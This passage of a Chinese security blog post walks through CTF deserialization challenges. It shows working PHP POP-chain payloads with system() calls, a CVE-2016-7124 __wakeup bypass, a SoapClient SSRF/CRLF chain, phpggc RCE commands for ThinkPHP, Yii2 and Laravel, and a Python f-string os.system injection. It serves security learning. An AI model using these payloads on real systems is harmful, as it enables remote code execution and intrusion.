+<h3 id="格式化字符串-类魔术方法引用"><a href="#格式化字符串-类魔术方法引用" class="headerlink" title="格式化字符串 - 类魔术方法引用"></a>格式化字符串 - 类魔术方法引用</h3><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3569?time__1311=n4+xnii=G=DQoiKDtbDs63xCqQEoi=iDg7nDQTID">Python Web之flask session&amp;格式化字符串漏洞 - 先知社区 (aliyun.com)</a></p>
+<p>f-Strings（可控格式化字符串）</p>
+<ul>
+<li>这是 python3.6 之后新增的一种格式化字符串方式，其功能十分强大，可以执行字符串中包含的 python 表达式</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmd">&gt;&gt;&gt; a , b = <span class="hljs-number">5</span> , <span class="hljs-number">10</span><br>&gt;&gt;&gt; f&#x27;Five plus ten is &#123;a + b&#125; and <span class="hljs-keyword">not</span> &#123;<span class="hljs-number">2</span> * (a + b)&#125;.&#x27;<br>&#x27;Five plus ten is <span class="hljs-number">15</span> and <span class="hljs-keyword">not</span> <span class="hljs-number">30</span>.&#x27;<br>&gt;&gt;&gt; f&#x27;&#123;__import__(&quot;os&quot;).system(&quot;id&quot;)&#125;&#x27;<br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br>&#x27;<span class="hljs-number">0</span>&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h1 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h1><h2 id="PHP篇"><a href="#PHP篇" class="headerlink" title="PHP篇"></a>PHP篇</h2><p>‍</p>
+<h3 id="PHP反序列化-POP链构造-魔术方法流程-漏洞触发条件-属性修改"><a href="#PHP反序列化-POP链构造-魔术方法流程-漏洞触发条件-属性修改" class="headerlink" title="PHP反序列化&amp;POP链构造&amp;魔术方法流程&amp;漏洞触发条件&amp;属性修改"></a>PHP反序列化&amp;POP链构造&amp;魔术方法流程&amp;漏洞触发条件&amp;属性修改</h3><ul>
+<li><p>POP链构造训练—ctfshow</p>
+<ol>
+<li><p>web254-对象引用执行逻辑</p>
+<p> ​<code>payload：username=xxxxxx&amp;password=xxxxxx</code>​</p>
+<p> ​<img src="/assets/image-20240827192540-g17lf9a.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> ​<img src="/assets/image-20240827192622-jtpqb8j.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>web255-反序列化变量修改</p>
+<p> ​<img src="/assets/image-20240827192654-p0agsw8.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li>
+<li><p>web256-反序列化参数修改</p>
+<p> ​<img src="/assets/image-20240827194138-mcp5vuv.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;ctftest&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p> ​<img src="/assets/image-20240827194402-ovry5xu.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>web257-反序列化参数修改&amp;对象调用逻辑</p>
+<p> ​<img src="/assets/image-20240827194439-n1s03oa.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;backDoor&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;<br><br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> ctfShowUser));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li>
+<li><p>web258-反序列化参数修改&amp;对象调用逻辑&amp;正则</p>
+<p> ​<img src="/assets/image-20240827194530-2c5lrey.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> ​<img src="/assets/image-20240827194555-lf7201b.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> ​<img src="/assets/image-20240827194608-w7qma87.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;backDoor&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(&#x27;tac flag.php&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>());<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:11&#x27;</span>,<span class="hljs-string">&#x27;:+11&#x27;</span>,<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:8&#x27;</span>,<span class="hljs-string">&#x27;:+8&#x27;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ul>
+<p>‍</p>
+<h3 id="PHP反序列化-原生类TIPS-CVE绕过漏洞-属性类型特征"><a href="#PHP反序列化-原生类TIPS-CVE绕过漏洞-属性类型特征" class="headerlink" title="PHP反序列化&amp;原生类TIPS&amp;CVE绕过漏洞&amp;属性类型特征"></a>PHP反序列化&amp;原生类TIPS&amp;CVE绕过漏洞&amp;属性类型特征</h3><ul>
+<li><p>CVE-2016-7124（__wakeup绕过）—[极客大挑战 2019]PHP</p>
+<p>​<img src="/assets/image-20240831175210-2qgy0iu.png" srcset="/img/loading.gif" lazyload alt="image-20240831175210-2qgy0iu">​</p>
+<p>下载源码分析</p>
+<p>​<img src="/assets/image-20240831175350-p3aysmm.png" srcset="/img/loading.gif" lazyload alt="image-20240831175350-p3aysmm">​</p>
+<p>​<img src="/assets/image-20240831175417-p952w45.png" srcset="/img/loading.gif" lazyload alt="image-20240831175417-p952w45">​</p>
+<p>​<img src="/assets/image-20240831175438-ykjc5iz.png" srcset="/img/loading.gif" lazyload alt="image-20240831175438-ykjc5iz">​</p>
+<p>分析会触发调用__wakeup 强制修改username值</p>
+<p>​<img src="/assets/image-20240831175533-sptispr.png" srcset="/img/loading.gif" lazyload alt="image-20240831175533-sptispr">​</p>
+<p>​<img src="/assets/image-20240831175549-wqfnmd0.png" srcset="/img/loading.gif" lazyload alt="image-20240831175549-wqfnmd0">​</p>
+<p>​<img src="/assets/image-20240831175625-nm3g8ne.png" srcset="/img/loading.gif" lazyload alt="image-20240831175625-nm3g8ne">​</p>
+<p>使用pop链构造payload(把private改为public)</p>
+<p>​<img src="/assets/image-20240831175707-euzgpyx.png" srcset="/img/loading.gif" lazyload alt="image-20240831175707-euzgpyx">​</p>
+<p>​<img src="/assets/image-20240831175725-qex8y4l.png" srcset="/img/loading.gif" lazyload alt="image-20240831175725-qex8y4l">​</p>
+<p>利用语言漏洞绕过 CVE-2016-7124，修改满足漏洞条件触发</p>
+<p>​<img src="/assets/image-20240831175807-wl806m4.png" srcset="/img/loading.gif" lazyload alt="image-20240831175807-wl806m4">​</p>
+<p>Payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">select=O%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>admin%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22100</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure>
+
+<p>​<img src="/assets/image-20240831175854-awl7iyk.png" srcset="/img/loading.gif" lazyload alt="image-20240831175854-awl7iyk">​</p>
+</li>
+<li><p>原生类—CTFshow-259</p>
+<p>题目</p>
+<p>​<img src="/assets/image-20240831194603-bmpux9r.png" srcset="/img/loading.gif" lazyload alt="image-20240831194603-bmpux9r">​</p>
+<p>这里flag.php要求</p>
+<p>1、ip必须为127.0.0.1</p>
+<p>2、以post方式接收token值，如果token值为ctfshow则会把flag写入flag.txt</p>
+<p>​<img src="/assets/image-20240831194519-7rcl7re.png" srcset="/img/loading.gif" lazyload alt="image-20240831194519-7rcl7re">​</p>
+<p>在首页及flag.php都没看到有魔术方法</p>
+<p>无代码通过原生类SoapClient(只生成_call方法的原生类)</p>
+<p>​<img src="/assets/image-20240831194828-94kkoxe.png" srcset="/img/loading.gif" lazyload alt="image-20240831194828-94kkoxe">​</p>
+<p>查询</p>
+<p>​<img src="/assets/image-20240831195222-y1y079y.png" srcset="/img/loading.gif" lazyload alt="image-20240831195222-y1y079y">​</p>
+<p>构造pop链</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ua</span>=<span class="hljs-string">&quot;aaa\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;<br><span class="hljs-variable">$client</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://127.0.0.1/&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-variable">$ua</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$client</span>));<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>​<img src="/assets/image-20240831195315-rlp5a12.png" srcset="/img/loading.gif" lazyload alt="image-20240831195315-rlp5a12">​</p>
+<p>​<img src="/assets/image-20240831195359-ichfzoi.png" srcset="/img/loading.gif" lazyload alt="image-20240831195359-ichfzoi">​</p>
+<p>通过访问本地flag.txt获取Flag</p>
+<p>​<img src="/assets/image-20240831195417-sjuq6jm.png" srcset="/img/loading.gif" lazyload alt="image-20240831195417-sjuq6jm">​</p>
+</li>
+<li><p>字符串逃逸—CTFshow</p>
+<p>极速版</p>
+<p>62 fuck  &#x3D; 62 loveu &#x3D; 310位数</p>
+<p>310位数 loveu +”;s:3:”msg”;s:1:”a”;s:2:”to”;s:1:”b”;s:5:”token”;s:5:”admin”;}<br>被正确的解析 token admin</p>
+<p>O:7:”message”:4:{s:4:”from”;s:310:”loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU”;s:3:”msg”;s:1:”a”;s:2:”to”;s:1:”b”;s:5:”token”;s:5:”admin”;}”;s:3:”msg”;s:1:”a”;s:2:”to”;s:1:”b”;s:5:”token”;s:4:”user”;}</p>
+</li>
+</ul>
+<p>‍</p>
+<h3 id="PHP反序列化-CLI框架类-PHPGGC生成器-TP-Yii-Laravel利用"><a href="#PHP反序列化-CLI框架类-PHPGGC生成器-TP-Yii-Laravel利用" class="headerlink" title="PHP反序列化&amp;CLI框架类&amp;PHPGGC生成器&amp;TP&amp;Yii&amp;Laravel利用"></a>PHP反序列化&amp;CLI框架类&amp;PHPGGC生成器&amp;TP&amp;Yii&amp;Laravel利用</h3><ul>
+<li><p>反序列化框架利用(phpggc)</p>
+<ol>
+<li><p>ThinkPHP</p>
+<p> [安洵杯 2019]iamthinking Thinkphp V6.0.X 反序列化</p>
+<p> ​<img src="/assets/image-20240901195034-vzscbxj.png" srcset="/img/loading.gif" lazyload alt="image-20240901195034-vzscbxj">​</p>
+<ol>
+<li><p><a target="_blank" rel="noopener" href="http://www.zip下载源码/">www.zip下载源码</a></p>
+</li>
+<li><p>查看源码</p>
+<p> ​<img src="/assets/image-20240901195114-5vpkw1t.png" srcset="/img/loading.gif" lazyload alt="image-20240901195114-5vpkw1t">​</p>
+<p> ​<img src="/assets/image-20240901195131-dy5cxk3.png" srcset="/img/loading.gif" lazyload alt="image-20240901195131-dy5cxk3">​</p>
+<p> ​<img src="/assets/image-20240901195148-jkg4w5i.png" srcset="/img/loading.gif" lazyload alt="image-20240901195148-jkg4w5i">​</p>
+<p> ​<img src="/assets/image-20240901195206-fpyal3r.png" srcset="/img/loading.gif" lazyload alt="image-20240901195206-fpyal3r">​</p>
+</li>
+<li><p>这里使用phpggc帮助我们生成一个thinkphp反序列化利用链(假设网上没有相关漏洞POC给你，但是你知道这个版本的thinkphp存在反序列化这种情况下)</p>
+<p> ​<img src="/assets/image-20240901195327-bdtq61l.png" srcset="/img/loading.gif" lazyload alt="image-20240901195327-bdtq61l">​</p>
+<p> ​<code>./phpggc ThinkPHP/RCE3 system &#39;cat /flag&#39; --url</code>​</p>
+<p> ​<img src="/assets/image-20240901195349-9c2kqdy.png" srcset="/img/loading.gif" lazyload alt="image-20240901195349-9c2kqdy">​</p>
+</li>
+<li><p>​<code>http://d67438dd-6483-4c05-bc40-1095050b015a.node4.buuoj.cn:81///public/?payload=</code>​</p>
+<p> ​<img src="/assets/image-20240901195423-1hgomcl.png" srcset="/img/loading.gif" lazyload alt="image-20240901195423-1hgomcl">​</p>
+<p> ​<img src="/assets/image-20240901195436-xq4ct5e.png" srcset="/img/loading.gif" lazyload alt="image-20240901195436-xq4ct5e">​</p>
+</li>
+</ol>
+</li>
+<li><p>Yii</p>
+<ol>
+<li><p>弱口令登录</p>
+<p> ​<img src="/assets/image-20240901195535-hem3emp.png" srcset="/img/loading.gif" lazyload alt="image-20240901195535-hem3emp">​</p>
+</li>
+<li><p>登录后，源码提示泄漏<br> GET：index.php?r=site%2Fabout&amp;view-source</p>
+<p> ​<img src="/assets/image-20240901195626-68x9609.png" srcset="/img/loading.gif" lazyload alt="image-20240901195626-68x9609">​</p>
+<p> ​<img src="/assets/image-20240901195647-6kb65o0.png" srcset="/img/loading.gif" lazyload alt="image-20240901195647-6kb65o0">​</p>
+<p> ​<img src="/assets/image-20240901195709-dqjp1ks.png" srcset="/img/loading.gif" lazyload alt="image-20240901195709-dqjp1ks">​</p>
+<p> ​<img src="/assets/image-20240901195732-rd9pil6.png" srcset="/img/loading.gif" lazyload alt="image-20240901195732-rd9pil6">​</p>
+</li>
+<li><p>​<code>./phpggc Yii2/RCE1 exec &#39;cp /fla* tt.txt&#39; --base64</code>​</p>
+<p> ​<img src="/assets/image-20240901195801-ahor7py.png" srcset="/img/loading.gif" lazyload alt="image-20240901195801-ahor7py">​</p>
+</li>
+<li><p>GET：<code>/index.php?r=backdoor/shell&amp;code=</code>​</p>
+<p> ​<img src="/assets/image-20240901195840-1jwmt86.png" srcset="/img/loading.gif" lazyload alt="image-20240901195840-1jwmt86">​</p>
+</li>
+<li><p>​<img src="/assets/image-20240901195854-241635c.png" srcset="/img/loading.gif" lazyload alt="image-20240901195854-241635c">​</p>
+</li>
+</ol>
+</li>
+<li><p>Laravel</p>
+<ol>
+<li><p>​<img src="/assets/image-20240901195920-81bgfkd.png" srcset="/img/loading.gif" lazyload alt="image-20240901195920-81bgfkd">​</p>
+</li>
+<li><p>​<img src="/assets/image-20240901195942-i0z572w.png" srcset="/img/loading.gif" lazyload alt="image-20240901195942-i0z572w">​</p>
+</li>
+<li><p>但是没有发现具体版本,只能一个一个试</p>
+<p> ​<img src="/assets/image-20240901200035-htaiuup.png" srcset="/img/loading.gif" lazyload alt="image-20240901200035-htaiuup">​</p>
+</li>
+<li><p>​<code>./phpggc Laravel/RCE1 system &quot;whoami&quot; --url</code>​</p>
+<p> ​<img src="/assets/image-20240901200150-j56nvpk.png" srcset="/img/loading.gif" lazyload alt="image-20240901200150-j56nvpk">​</p>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ul>
+<p>‍</p>
+<p>‍</p>
+<h2 id="JAVA篇"><a href="#JAVA篇" class="headerlink" title="JAVA篇"></a>JAVA篇</h2><h2 id="Python篇"><a href="#Python篇" class="headerlink" title="Python篇"></a>Python篇</h2>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>http://example.com/2024/11/09/反序列化漏洞🦇/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>0z-sIHN</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年11月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/11/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%F0%9F%92%BC/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/11/09/XXE%E6%BC%8F%E6%B4%9E%F0%9F%A6%8B/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
